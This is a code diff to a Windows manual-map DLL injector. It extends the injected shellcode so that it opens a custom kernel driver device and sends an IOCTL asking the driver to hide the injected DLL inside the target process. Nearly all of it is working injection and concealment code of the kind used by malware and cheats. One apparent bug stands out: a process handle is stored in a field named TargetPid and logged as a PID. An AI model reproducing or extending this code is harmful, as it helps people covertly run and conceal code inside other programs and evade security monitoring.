@@ -30,6 +30,7 @@ struct _RESOURCES
     BYTE* Injected_dll_base;
     BYTE* ResourceBase;
     BYTE* Injected_Shellcode_base;
+    HANDLE TargetPid;
 
 }sResources_for_shellcode;
 
@@ -370,6 +371,7 @@ NTSTATUS ManualMap(HANDLE hproc, std::vector <unsigned char> *downloaded_dll)
         sResources_for_shellcode.Injected_dll_base = pTargetBase;
         sResources_for_shellcode.Injected_Shellcode_base = pShellcodeTargetBase;
         sResources_for_shellcode.ResourceBase = pShellcodeResourceBase;
+        sResources_for_shellcode.TargetPid = hproc;
     //--------------------------------------------------fill resources data before this------------------
 
     if(!WriteProcessMemory(hproc, pShellcodeResourceBase, &sResources_for_shellcode, sizeof(sResources_for_shellcode), nullptr))
@@ -518,7 +520,8 @@ static void* FindExportAddress(HMODULE hModule, const char* funcName)
     typedef PVOID(NTAPI* pfnRtlAllocateHeap)(PVOID HeapHandle, ULONG Flags, SIZE_T Size);
     typedef BOOL(NTAPI* pfnRtlFreeHeap)(PVOID HeapHandle, ULONG Flags, PVOID BaseAddress);
     
-    typedef HANDLE (WINAPI* pfnCreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
+    typedef HANDLE(WINAPI* pfnCreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
+    typedef BOOL(WINAPI* pfnDeviceIoControl)(HANDLE hDevice, DWORD dwIoControlCode, LPVOID lpInBuffer, DWORD nInBufferSize, LPVOID lpOutBuffer, DWORD nOutBufferSize, LPDWORD lpBytesReturned, LPOVERLAPPED lpOverlapped);
     ///////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
     typedef struct _DLLMAIN_THREAD_PARAMS
@@ -552,7 +555,9 @@ static void* FindExportAddress(HMODULE hModule, const char* funcName)
     __declspec(allocate(".stub")) static const CHAR cNtDelayExecutionFunction[] = "NtDelayExecution";
     __declspec(allocate(".stub")) static const CHAR cRtlAllocateHeapFunction[] = "RtlAllocateHeap";
     __declspec(allocate(".stub")) static const CHAR cRtlFreeHeapFunction[] = "RtlFreeHeap";
+
     __declspec(allocate(".stub")) static const CHAR cCreateFileWFunction[] = "CreateFileW";
+    __declspec(allocate(".stub")) static const CHAR cDeviceIoControlFunction[] = "DeviceIoControl";
 
     __declspec(allocate(".stub")) pfnMessageBoxW my_MessageBoxW = nullptr;
     __declspec(allocate(".stub")) pfnOutputDebugStringW my_OutputDebugStringW = nullptr;
@@ -569,6 +574,7 @@ static void* FindExportAddress(HMODULE hModule, const char* funcName)
     __declspec(allocate(".stub")) pfnRtlFreeHeap my_RtlFreeHeap = nullptr;
     
     __declspec(allocate(".stub")) pfnCreateFileW my_CreateFileW = nullptr;
+    __declspec(allocate(".stub")) pfnDeviceIoControl my_DeviceIoControl = nullptr;
 
     __declspec(allocate(".stub")) static const WCHAR g_hexChars[] = L"0123456789ABCDEF";
     __declspec(allocate(".stub")) static WCHAR g_shellcodeLogBuffer[256];
@@ -1718,7 +1724,15 @@ static void* FindExportAddress(HMODULE hModule, const char* funcName)
             PVOID DllBase;
             UNICODE_STRING FullDllName;
             UNICODE_STRING BaseDllName;
-        } LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;    
+        } LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
+
+        struct _HIDE_MODULE_RESOURCES
+        {
+
+            HANDLE hTargetPid;
+            PVOID vpInjectedDll_Base; 
+
+        };
 
         _RESOURCES* pResources = (_RESOURCES*)lpParameter;
 
@@ -1776,6 +1790,9 @@ static void* FindExportAddress(HMODULE hModule, const char* funcName)
 
         my_CreateFileW = (pfnCreateFileW)ShellcodeFindExportAddress(sLibs.hKERNELBASE, cCreateFileWFunction, my_LoadLibraryA);
         if(my_CreateFileW == NULL) __debugbreak();
+
+        my_DeviceIoControl = (pfnDeviceIoControl)ShellcodeFindExportAddress(sLibs.hKERNELBASE, cDeviceIoControlFunction, my_LoadLibraryA);
+        if(my_DeviceIoControl == NULL) __debugbreak();
         
         ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
@@ -1830,14 +1847,30 @@ static void* FindExportAddress(HMODULE hModule, const char* funcName)
 
         #pragma region Driver_Communication
 
-        // __debugbreak();
+    // __debugbreak();
+        constexpr ULONG HIDE_MODULE_REQUEST = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x900, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
 
+        
         __declspec(allocate(".stub")) static const WCHAR s3[] = L"\\\\.\\baaaa_bae";
 
-        HANDLE hDevice = my_CreateFileW(s3, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
-        if(hDevice == INVALID_HANDLE_VALUE) { LOG_W(L"[SHELLCODE] [!!!!] Failed to open device -> INVALID_HANDLE_VALUE\n");  return; }
+        HANDLE hDriver = my_CreateFileW(s3, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+        if(hDriver == INVALID_HANDLE_VALUE) { LOG_W(L"[SHELLCODE] [!!!!] Failed to open device -> INVALID_HANDLE_VALUE\n");  return; }
         else LOG_W(L"[SHELLCODE] Successfully opened device\n");
 
+        
+        __declspec(allocate(".stub")) static _HIDE_MODULE_RESOURCES sHideModuleResourcesStorage = {};
+        _HIDE_MODULE_RESOURCES* sHideModuleResources = &sHideModuleResourcesStorage;
+        sHideModuleResources->vpInjectedDll_Base = pResources->Injected_dll_base;
+        sHideModuleResources->hTargetPid = pResources->TargetPid;
+
+
+        LOG_W(L"[SHELLCODE] Sending hide request to driver for PID: %p\n", sHideModuleResources->hTargetPid);
+        DWORD bytes_returned = 0;
+        BOOL success = my_DeviceIoControl(hDriver, HIDE_MODULE_REQUEST, sHideModuleResources, 16, nullptr, 0, &bytes_returned, nullptr);
+        if (success) LOG_W(L"[SHELLCODE] Driver acknowledged the request successfully!\n");
+        else LOG_W(L"[SHELLCODE] [!!!!] Driver returned an error for the request.\n");
+
+        my_CloseHandle(hDriver);
         #pragma endregion
     }
 
